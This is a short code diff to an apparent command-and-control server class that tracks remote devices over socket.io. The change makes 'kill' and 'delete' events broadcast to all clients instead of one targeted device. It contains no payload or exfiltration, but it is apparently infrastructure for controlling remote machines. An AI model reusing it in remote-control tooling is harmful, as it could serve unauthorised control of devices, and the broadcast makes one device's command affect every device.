@@ -110,7 +110,7 @@ class C2:
             self.devices.update({data["uid"]: data})
             self.total_devices.update({data["uid"]: data})
         else:
-            self.sio.emit("kill", {"uid": data["uid"]}, to=data["sid"])
+            self.sio.emit("kill", {"uid": data["uid"]})
 
         self.update_json()
 
@@ -130,7 +130,7 @@ class C2:
             self.total_devices.pop(device_id)
             if device_id in self.devices:
                 self.devices.pop(device_id)
-                self.sio.emit("delete", {'uid': device_id}, to=self.devices[device_id]["sid"])
+                self.sio.emit("delete", {'uid': device_id})
                 return (True, "")
         except Exception as err:
             return (False, err)
